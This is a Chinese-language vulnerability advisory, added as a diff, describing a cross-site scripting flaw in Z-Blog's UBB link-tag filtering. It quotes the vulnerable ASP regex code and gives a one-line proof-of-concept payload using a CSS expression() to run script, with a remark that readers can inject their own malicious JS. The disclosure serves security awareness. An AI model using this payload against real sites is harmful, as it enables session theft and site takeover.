@@ -1,0 +1,47 @@
+Z-blog又一严重跨站脚本攻击漏洞
+
+[Z-blog又一严重跨站脚本攻击漏洞 全文]Z-blog又一严重跨站脚本攻击漏洞 
+漏洞说明：Z-Blog是一款基于Asp平台的Blog博客(网志)程序，支持Wap，支持Firefox，Oprea等浏览器，在国内使用非常广泛，官方主页http://www.rainbowsoft.org/。Z-blog代码严谨，前台功能简洁，后台功能强大，这为它的产品安全带来很大的优势，但是在上次的xss漏洞被公布后，80sec在产品中又发现一个严重的跨站脚本攻击漏洞，加上产品设计上的一些问题可能带来严重的后果。 
+
+漏洞厂商http://www.rainbowsoft.org/ 
+
+漏洞解析：在FUNCTION/c_function.asp中，程序处理UBB标签的时候存在漏洞，导致任何用户可以在目标页面内执行任意js代码，利用该代码恶意用户可以获取目标站点的所有权限。漏洞代码如下： 
+
+
+Function UBBCode(ByVal strContent,strType) 
+
+Dim objRegExp 
+Set objRegExp=new RegExp 
+objRegExp.IgnoreCase =True 
+objRegExp.Global=True 
+
+If ZC_UBB_LINK_ENABLE And Instr(strType,"[link]“)>0 Then 
+
+objRegExp.Pattern=”(\[URL\])(([a-zA-Z0-9]+?):\/\/\S+?)(\[\/URL\])” 
+strContent= objRegExp.Replace(strContent,”$2“) 
+
+objRegExp.Pattern=”(\[URL\])(.+?)(\[\/URL\])” 
+strContent= objRegExp.Replace(strContent,”$2“) 
+
+objRegExp.Pattern=”(\[URL=)(([a-zA-Z0-9]+?):\/\/\S+?)(\])(.+?)(\[\/URL\])” 
+strContent= objRegExp.Replace(strContent,”$5“) 
+
+objRegExp.Pattern=”(\[URL=)(\S+?)(\])(\S+?)(\[\/URL\])” 
+strContent= objRegExp.Replace(strContent,”$4“) 
+
+objRegExp.Pattern=”(\[EMAIL\])(\S+\@\S+?)(\[\/EMAIL\])” 
+strContent= objRegExp.Replace(strContent,”$2“) 
+
+objRegExp.Pattern=”(\[EMAIL=)(\S+\@\S+?)(\])(.+?)(\[\/EMAIL\])” 
+strContent= objRegExp.Replace(strContent,”$4“) 
+
+End If 
+
+可以看到其中的正则表达式过滤并不严格，这种循环匹配也很容易出现逻辑问题，精心构造代码即可触发跨站脚本漏洞 
+
+
+[URL][URL]http://=’’style=’c:expression(alert())’[/URL][/URL] 
+
+上面代码将循环执行alert()，当然，你也可以引入自己的恶意js执行：） 
+
+漏洞状态：该漏洞非常危险，完全不需要任何交互行为即可完成攻击 
